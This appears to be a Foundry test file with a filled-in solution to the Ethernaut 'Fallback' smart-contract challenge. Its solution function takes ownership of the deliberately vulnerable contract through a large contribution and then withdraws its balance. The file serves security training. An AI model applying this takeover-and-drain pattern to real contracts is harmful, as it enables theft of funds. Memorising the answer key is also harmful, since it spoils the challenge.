// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Fallback} from "../../src/ethernaut/01_Fallback/Fallback.sol";
import {Fallback_Factory} from "../../src/ethernaut/01_Fallback/Fallback_Factory.sol";
import {Fallback_Attacker} from "./01_Fallback_Attacker.sol";

contract Fallback_Test is Test {
	address deployer = makeAddr("deployer");
	address player = makeAddr("player");

	Fallback_Factory factory;
	Fallback instContract;
	
	modifier checkSolvedByPlayer() {
		vm.startPrank(player, player);
		_;
		vm.stopPrank();
		_isSolved();
	}
	
	/**
	 * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
	 */
	function _isSolved() private view {
		if (factory.validateInstance(player)) {
			console.log("\x1b[33m%s\x1b[0m", ">>>>>>>>>>>>>> Congratulations, you have successfully completed the challenge >>>>>>>>>>>>>>");
		} else {
			revert(">>>>>>>>>>>>>> Sorry, you failed the challenge >>>>>>>>>>>>>>");
		}
	}
	
	/**
	 * SETS UP CHALLENGE - DO NOT TOUCH
	 */
	function setUp() public {
		startHoax(deployer);
		
		factory = new Fallback_Factory();
		instContract = Fallback(payable(factory.createInstance(player)));
		
		vm.stopPrank();
		
		vm.deal(address(player), 101 ether);
	}
	
	function test__Solution_Fallback() public checkSolvedByPlayer {
		// CODE YOUR SOLUTION HERE
		// forge test --mt test__Solution_Fallback -vv
		
		instContract.contribute{value: 101 ether}();
		vm.assertTrue(instContract.owner() == player);
		vm.assertTrue(address(instContract).balance == 101 ether);
		
		instContract.withdraw();
		vm.assertTrue(address(player).balance == 101 ether);
	}
}
